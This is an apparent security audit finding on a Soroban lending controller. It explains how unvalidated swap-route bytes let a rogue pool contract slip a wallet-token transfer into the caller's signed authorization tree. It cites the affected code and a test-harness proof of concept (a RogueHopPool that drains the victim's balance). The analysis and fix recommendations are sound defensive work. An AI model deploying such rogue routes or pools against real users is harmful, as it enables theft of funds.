### Title
Unvalidated swap routes can attach unauthorized wallet transfers to the caller’s signed authorization tree - (File: contracts/controller/src/strategies/swap.rs)

### Summary
`swap_collateral`, `swap_debt`, `repay_debt_with_collateral`, and `multiply` accept caller-supplied opaque `Bytes` routes and pass them to the configured swap aggregator. Because route-selected venue code executes below the caller’s `require_auth` tree, a malicious route can add a nested `token.transfer(caller, attacker, amount)` request for an unrelated wallet token. If simulation returns that poisoned authorization tree and the caller signs it without inspecting every child invocation, the malicious venue contract can drain that unrelated wallet balance while still returning enough output for the lending operation to succeed.

### Finding Description
The controller accepts user-controlled route bytes in public strategy entrypoints such as `swap_collateral` and forwards those bytes to the router in `swap_tokens`. [1](#0-0) [2](#0-1) 

Before invoking the router, the controller grants only one exact invoker-contract authorization for the routed input token: `transfer(controller, router, amount_in)`. [3](#0-2)  That authorization protects controller-held collateral, but it does not constrain what the router’s route-selected contracts request from the original `caller`.

The swap route contains an address registry carrying pool addresses and a packed instruction stream selecting hops. [4](#0-3)  Route execution constructs `SwapHop` directly from those payload-supplied addresses and dispatches the selected venue. [5](#0-4)  The venue adapter then invokes the supplied `pool` address. [6](#0-5)  No production allowlist restricts that invoked contract.

Consequently, a route can name an attacker-deployed “pool” whose `swap` implementation requests `wallet_token.transfer(victim, attacker, amount)`. During simulation, that request is recorded as a child beneath the victim’s root `swap_collateral` authorization rather than beneath the controller’s separate invoker authorization. [7](#0-6)  Signing the simulated tree therefore authorizes the unrelated token transfer.

This is a contract-level analogue of SSRF: the user supplies a destination that causes trusted execution to contact arbitrary code, while the resulting privileged request is merged into the user-facing authorization tree.

### Impact Explanation
A successful poisoned route can steal unrelated tokens held by the caller’s wallet, not merely consume the collateral amount routed through the strategy. The theft is bounded only by the token balance and the amount requested by the malicious child invocation.

The repository’s dedicated harness demonstrates that the malicious hop can transfer the victim’s entire unrelated `WALLET_BALANCE` to the attacker while the controller still receives and deposits the expected swap output. [8](#0-7)  It also demonstrates that the transfer executes once the signed authorization tree contains the malicious child. [9](#0-8) 

This is theft of user funds and qualifies as High severity.

### Likelihood Explanation
The attack requires the victim to submit or sign a malicious route and its resulting authorization tree. That requirement reduces likelihood compared with a purely permissionless theft.

However, the route is passed as opaque serialized `Bytes`, and the dangerous pool/token addresses are nested inside route execution rather than exposed as first-class controller arguments. A malicious frontend, route API, copied transaction, or compromised route source can present a plausible strategy while embedding a rogue hop. The exploit does not require control of the router, pool, protocol admin, victim’s private key, or an existing token allowance; it needs only the victim’s signature over the poisoned tree.

A correctly implemented client that decodes the route and refuses every unexpected child authorization prevents the transfer. The contracts themselves do not provide a route allowlist or another protection that makes the malicious nested request impossible.

### Recommendation
Do not rely on users to inspect every simulated authorization child for opaque route bytes.

Prefer a contract-level registry of approved venue contracts/pools, or provide controller strategy variants that accept only a governance-approved route identifier rather than arbitrary serialized routes. If arbitrary routing remains required, the router should constrain route-selected external calls to known venue ABIs and governance-approved pool addresses, while clients must independently decode routes and reject any authorization tree containing transfers other than the expected strategy input authorization.

At minimum, expose the resolved pool/token chain in a structured event or preflight interface and document that a valid route must produce no unexpected child invocations under the caller’s root authorization.

### Proof of Concept
The repository already contains a minimal executable proof:

1. Deploy an attacker-controlled `RogueHopPool` configured with `(victim, unrelated_wallet_token, attacker, WALLET_BALANCE)`.
2. Configure a router that invokes the route-supplied pool and returns fair output.
3. Have Alice call `swap_collateral(account_id, USDC, amount, ETH, route)`.
4. During route execution, the rogue pool calls `wallet_token.transfer(Alice, attacker, WALLET_BALANCE)`.
5. Simulation records this transfer as a child beneath Alice’s `swap_collateral` root authorization.
6. Alice signs that returned tree.
7. The unrelated wallet token moves from Alice to the attacker, while the protocol swap still supplies the expected ETH collateral.

The fixture defines the malicious router and pool at `tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs:33-70`; the auth-tree recording and resulting balance theft are asserted at lines `194-226`; enforced authorization executes the malicious child at lines `258-268`.

### Citations

**File:** contracts/controller/src/lib.rs (L283-302)
```rust
    fn swap_collateral(
        env: Env,
        caller: Address,
        account_id: u64,
        current: HubAssetKey,
        amount: i128,
        new: HubAssetKey,
        swap: Bytes,
    ) {
        strategies::swap_collateral::process_swap_collateral(
            &env,
            &caller,
            SwapCollateralParams {
                account_id,
                current: &current,
                from_amount: amount,
                new: &new,
                swap: &swap,
            },
        );
```

**File:** contracts/controller/src/strategies/swap.rs (L33-38)
```rust
    // Authorize only this token transfer to this router for this exact amount.
    authorize_transfer_as_current(env, token_in, &controller, &router_addr, amount_in);

    storage::with_flash_guard(env, || {
        let _ = router.execute_strategy(&controller, &amount_in, swap);
    });
```

**File:** common/src/token.rs (L33-51)
```rust
/// Authorizes, on behalf of the current contract, one `transfer(from, to, amount)`
/// call on `token_addr` made deeper in the next contract call (for example by
/// the pool). The entry allows no further sub-invocations.
pub fn authorize_transfer_as_current(
    env: &Env,
    token_addr: &Address,
    from: &Address,
    to: &Address,
    amount: i128,
) {
    let entry = InvokerContractAuthEntry::Contract(SubContractInvocation {
        context: ContractContext {
            contract: token_addr.clone(),
            fn_name: symbol_short!("transfer"),
            args: (from.clone(), to.clone(), amount).into_val(env),
        },
        sub_invocations: Vec::new(env),
    });
    env.authorize_as_current_contract(vec![env, entry]);
```

**File:** contracts/swap-aggregator/src/types.rs (L32-44)
```rust
/// Full strategy decoded from `execute_strategy` XDR.
///
/// Instructions reference `assets` and `amounts` by `u8` index, so an address
/// or amount used by several hops is carried exactly once.
#[contracttype]
#[derive(Clone, Debug)]
pub struct StrategyPayload {
    /// Amount registry: min-out, fixed inputs, burn floors, mint min-shares.
    pub amounts: Vec<i128>,
    /// Address registry: tokens, pools, and LP share tokens.
    pub assets: Vec<Address>,
    /// Packed program: header, instruction records, split weights.
    pub ops: Bytes,
```

**File:** contracts/swap-aggregator/src/execute/mod.rs (L151-170)
```rust
    match op.opcode {
        Opcode::Swap(venue) => {
            let hop = SwapHop {
                pool: ctx.assets.get_unchecked(op.idx_a),
                token_in: ctx.assets.get_unchecked(op.idx_b),
                token_out: ctx.assets.get_unchecked(op.idx_c),
                venue,
            };
            let amount_in = resolve_amount(ctx, vault, op.mode, &hop.token_in, prev);
            if amount_in <= 0 {
                panic_with_error!(ctx.env, Error::InvalidAmount);
            }

            vault.withdraw(&hop.token_in, amount_in);
            let out = venues::dispatch_hop(ctx.env, ctx.router, &hop, amount_in, tokens_cache);
            if out <= 0 {
                panic_with_error!(ctx.env, Error::ZeroOutput);
            }
            vault.deposit(&hop.token_out, out);
            Some((hop.token_out, out))
```

**File:** contracts/swap-aggregator/src/venues/aquarius/pool.rs (L16-35)
```rust
pub(super) fn invoke_pool_swap(
    env: &Env,
    router: &Address,
    pool: &Address,
    token_in: &Address,
    in_idx: u32,
    out_idx: u32,
    amount_in: i128,
) {
    authorize_token_transfer(env, token_in, router, pool, amount_in);
    let args: Vec<Val> = vec![
        env,
        router.into_val(env),
        in_idx.into_val(env),
        out_idx.into_val(env),
        to_u128(env, amount_in).into_val(env),
        0_u128.into_val(env),
    ];
    let _: u128 = env.invoke_contract(pool, &symbol_short!("swap"), args);
}
```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L39-70)
```rust
    pub fn execute_strategy(env: Env, sender: Address, total_in: i128, swap_xdr: Bytes) -> i128 {
        sender.require_auth();
        let route = RoutedSwap::from_xdr(&env, &swap_xdr).expect("route must decode");
        let router = env.current_contract_address();
        token::Client::new(&env, &route.token_in).transfer(&sender, &router, &total_in);
        let _: Val = env.invoke_contract(&route.hop_pool, &symbol_short!("swap"), vec![&env]);
        token::Client::new(&env, &route.token_out).transfer(&router, &sender, &route.min_out);
        route.min_out
    }
}

/// Attacker-deployed "pool". `amount == 0` is the benign control.
#[contract]
pub struct RogueHopPool;

#[contractimpl]
impl RogueHopPool {
    pub fn __constructor(env: Env, victim: Address, token: Address, to: Address, amount: i128) {
        env.storage()
            .instance()
            .set(&symbol_short!("PLAN"), &(victim, token, to, amount));
    }

    pub fn swap(env: Env) {
        let (victim, wallet_token, to, amount): (Address, Address, Address, i128) = env
            .storage()
            .instance()
            .get(&symbol_short!("PLAN"))
            .expect("plan is set by the constructor");
        if amount > 0 {
            token::Client::new(&env, &wallet_token).transfer(&victim, &to, &amount);
        }
```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L194-226)
```rust
#[test]
fn simulation_records_the_rogue_pool_wallet_transfer_under_the_callers_swap_collateral_entry() {
    let s = Scene::new();
    let route = s.route_through_pool_stealing(WALLET_BALANCE);

    // `simulateTransaction` runs recording mode with non-root auth disabled.
    s.t.env.mock_all_auths();
    s.try_swap(&route)
        .expect("recording mode accepts the route");
    let recorded = s.t.env.auths();
    std::println!("recorded auth tree = {recorded:#?}");

    let stolen_transfer = AuthorizedInvocation {
        function: AuthorizedFunction::Contract((
            s.wallet_token.clone(),
            symbol_short!("transfer"),
            (s.alice.clone(), s.attacker.clone(), WALLET_BALANCE).into_val(&s.t.env),
        )),
        sub_invocations: std::vec![],
    };
    let poisoned_root = AuthorizedInvocation {
        function: AuthorizedFunction::Contract((
            s.t.controller.clone(),
            Symbol::new(&s.t.env, "swap_collateral"),
            s.swap_args(&route),
        )),
        sub_invocations: std::vec![stolen_transfer],
    };
    assert_eq!(recorded, std::vec![(s.alice.clone(), poisoned_root)]);

    assert_eq!(s.wallet(&s.alice), 0);
    assert_eq!(s.wallet(&s.attacker), WALLET_BALANCE);
    assert_eq!(s.t.supply_balance_raw(ALICE, "ETH"), FAIR_OUT_ETH);
```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L258-268)
```rust
    // Same route, with the tree that simulation returned.
    let stolen_transfer = MockAuthInvoke {
        contract: &s.wallet_token,
        fn_name: "transfer",
        args: (s.alice.clone(), s.attacker.clone(), WALLET_BALANCE).into_val(&s.t.env),
        sub_invokes: &[],
    };
    s.try_swap_with_signed_tree(&rogue, core::slice::from_ref(&stolen_transfer))
        .expect("the poisoned tree authorizes the rogue transfer");
    assert_eq!(s.wallet(&s.alice), 0);
    assert_eq!(s.wallet(&s.attacker), WALLET_BALANCE);
```
